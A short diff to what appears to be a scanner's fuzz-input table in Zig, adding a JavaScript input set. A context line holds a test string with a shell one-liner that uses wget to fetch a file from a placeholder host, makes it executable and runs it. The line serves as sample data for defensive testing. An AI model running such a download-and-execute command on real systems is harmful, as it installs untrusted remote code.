@@ -1141,6 +1141,7 @@ const Formats = struct {
         } },
         .{ .name = "fmt.mime", .inputs = &zav.fmt.mime.evasion_bytes },
         .{ .name = "fmt.pdf", .inputs = documents(".pdf") },
+        .{ .name = "fmt.js", .inputs = &zav.fmt.js_norm.fuzz_pages },
         .{ .name = "fmt.text", .inputs = &.{
             "Plain TEXT with\tTabs and\r\nCRLF lines\n\n  and   runs of   SPACE\x00\x01",
             "#!/bin/sh\nwget http://x.example/a -O /tmp/a && chmod +x /tmp/a && /tmp/a\n",
